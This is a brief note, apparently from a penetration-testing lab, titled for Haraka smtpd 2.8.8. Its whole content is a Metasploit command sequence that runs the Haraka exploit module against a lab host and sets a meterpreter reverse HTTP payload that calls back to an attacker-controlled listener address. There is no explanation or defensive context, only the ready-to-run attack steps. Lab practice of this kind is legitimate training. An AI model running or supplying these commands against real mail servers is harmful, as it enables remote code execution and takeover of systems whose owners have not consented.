
### Haraka smtpd 2.8.8  

```bash
use exploit/linux/smtp/haraka
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set rhost demo.ine.local
set LHOST 192.164.31.2
exploit
```
